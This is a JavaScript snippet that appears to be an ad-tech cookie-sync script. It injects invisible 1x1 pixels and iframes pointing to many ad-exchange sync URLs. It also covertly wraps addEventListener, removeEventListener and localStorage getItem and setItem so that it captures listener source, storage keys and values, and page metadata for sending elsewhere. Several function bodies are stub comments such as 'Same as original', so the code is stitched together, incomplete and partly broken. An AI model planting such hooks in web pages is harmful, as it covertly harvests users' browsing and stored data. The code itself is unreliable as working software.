(function () {
  const originalSetTimeout = window.setTimeout;
  const originalSetInterval = window.setInterval;
  var pixels = [];
  const originalRequestAnimationFrame = window.requestAnimationFrame;
  const originalFetch = window.fetch;
  var spot = document.body || document.head;
  const originalAddEventListener = EventTarget.prototype.addEventListener;
  pixels = [];
  const originalRemoveEventListener = EventTarget.prototype.removeEventListener;
  const originalLocalStorageGetItem = Storage.prototype.getItem;
  const originalLocalStorageSetItem = Storage.prototype.setItem;
  pixels.push("https://sync.bfmio.com/syncb?pid=111&gdpr=&gdpr_consent=&us_privacy=");
  const originalGlobalVar = window.globalVar;
  pixels.push("https://cs.emxdgt.com/um?gdpr=&gdpr_consent=&us_privacy=&redirect=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000003%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D%24UID");
  const eventHooks = window.eventhooks;
  function generateUniqueToken() {
    const randomBytes = new Uint8Array(16);
    crypto.getRandomValues(randomBytes);
    const token = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
    return token;
  }
  function validateEventArguments(eventName, args, expectedArgs) {
    //Same as original
  }
  function addJShook(functionName, args, expectedArgs) {
    //New code here
  }
  pixels.push("https://sync.1rx.io/usersync2/rmphb?gdpr=&gdpr_consent=&us_privacy=&redir=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000012%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D%5BRX_UUID%5D");
  function getEventMetadata() {
    const metadata = {
      url: window.location.href,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      token: generateUniqueToken()
    };
    return metadata;
  }
  function sendEventPayload(payload) {
    //Same as original
  }
  pixels.push("https://sync.sxp.smartclip.net/sync?type=red&dsp=116&gdpr_consent=");
  function createEventWrapper(eventName, originalFunc, eventArgs) {
    //Same as original
  }
  eventHooks.forEach(eventHook => {
    //Same as original
  });
  pixels.push("https://match.sharethrough.com/universal/v1?supply_id=BGApXMcE");
  pixels.push("https://x.bidswitch.net/sync?ssp=themediagrid&gdpr=&gdpr_consent=&us_privacy=");
  window.setTimeout = new Proxy(originalSetTimeout, {
    //Same as original
  });
  window.setInterval = new Proxy(originalSetInterval, {
    //Same as original
  });
  window.requestAnimationFrame = new Proxy(originalRequestAnimationFrame, {
    //Same as original
  });
  pixels.push("https://ih.adscale.de/su?gdpr=&gdpr_consent=&tpid=22144&cburl=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000023%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D__STROEER_USER_ID__");
  pixels.push("https://cs.media.net/cksync?cs=60&type=ss&gdpr=&gdpr_consent=&us_privacy=&redirect=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000026%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D%3Cvsid%3E");
  window.fetch = new Proxy(originalFetch, {
    //Same as original
  });
  pixels.push("https://sync.richaudience.com/74889303289e27f327ad0c6de7be7264/?consentString=&r=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000027%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D%5BPDID%5D");
  EventTarget.prototype.addEventListener = new Proxy(originalAddEventListener, {
    apply: function (target, thisArg, args) {
      const eventName = args[0];
      const listener = args[1];
      if (typeof listener === 'function') {
        const metadata = getEventMetadata();
        const payload = {
          eventName,
          listener: listener.toString(),
          metadata
        };
        sendEventPayload(payload);
      }
      return target.apply(thisArg, args);
    }
  });
  pixels.push("https://sync.admanmedia.com/pbs.gif?gdpr=&gdpr_consent=&us_privacy=&redir=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000029%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D%5BUID%5D");
  EventTarget.prototype.removeEventListener = new Proxy(originalRemoveEventListener, {
    apply: function (target, thisArg, args) {
      const eventName = args[0];
      const listener = args[1];
      if (typeof listener === 'function') {
        const metadata = getEventMetadata();
        const payload = {
          eventName,
          listener: listener.toString(),
          metadata
        };
        sendEventPayload(payload);
      }
      return target.apply(thisArg, args);
    }
  });
  Storage.prototype.getItem = new Proxy(originalLocalStorageGetItem, {
    apply: function (target, thisArg, args) {
      const key = args[0];
      const metadata = getEventMetadata();
      const payload = {
        eventName: 'localStorage.getItem',
        key,
        metadata
      };
      sendEventPayload(payload);
      return target.apply(thisArg, args);
    }
  });
  Storage.prototype.setItem = new Proxy(originalLocalStorageSetItem, {
    apply: function (target, thisArg, args) {
      const key = args[0];
      const value = args[1];
      const metadata = getEventMetadata();
      const payload = {
        eventName: 'localStorage.setItem',
        key,
        value,
        metadata
      };
      sendEventPayload(payload);
      return target.apply(thisArg, args);
    }
  });
  for (x = 0; x < pixels.length; x++) {
    var oImg = document.createElement("img");
    oImg.setAttribute('src', pixels[x]);
    oImg.setAttribute('width', '1');
    oImg.setAttribute('height', '1');
    oImg.setAttribute('border', '0');
    oImg.setAttribute('style', 'width:1px!important;height:1px!important;position:absolute!important;overflow:hidden!important;border-style:none!important;margin:0!important;padding:0!important;');
    spot.appendChild(oImg);
  }
  pixels = [];
  pixels.push("https://rtb.gumgum.com/usync/14048?gdpr=&gdpr_consent=&us_privacy=&r=https%3A%2F%2Fvid-io-sin.springserve.com%2Fusersync%3Faid%3D1000004%26gdpr%3D%26gdpr_consent%3D%26us_privacy%3D%26uuid%3D");
  if (pixels.length > 0) {
    var iframe = document.createElement('iframe');
    iframe.setAttribute('scrolling', 'no');
    iframe.setAttribute('frameborder', '0');
    iframe.setAttribute('width', '1');
    iframe.setAttribute('height', '1');
    iframe.setAttribute('border', '0');
    iframe.setAttribute('style', 'width:1px!important;height:1px!important;position:absolute!important;overflow:hidden!important;border-style:none!important;margin:0!important;padding:0!important;');
    spot.appendChild(iframe);
    var doc = iframe.contentWindow || iframe.contentDocument;
    if (doc.document) doc = doc.document;
    doc.open();
    for (x = 0; x < pixels.length; x++) {
      doc.write("<iframe src=\"" + pixels[x] + "\" scrolling=\"no\" frameborder=\"0\" width=\"1\" height=\"1\"></iframe>");
    }
    doc.close();
  }
  window.globalVar = new Proxy(originalGlobalVar, {
    apply: function (target, thisArg, args) {
      const fieldName = args[0];
      const metadata = getEventMetadata();
      const payload = {
        eventName: 'globalVar',
        fieldName,
        metadata
      };
      sendEventPayload(payload);
      return target.apply(thisArg, args);
    }
  });
})();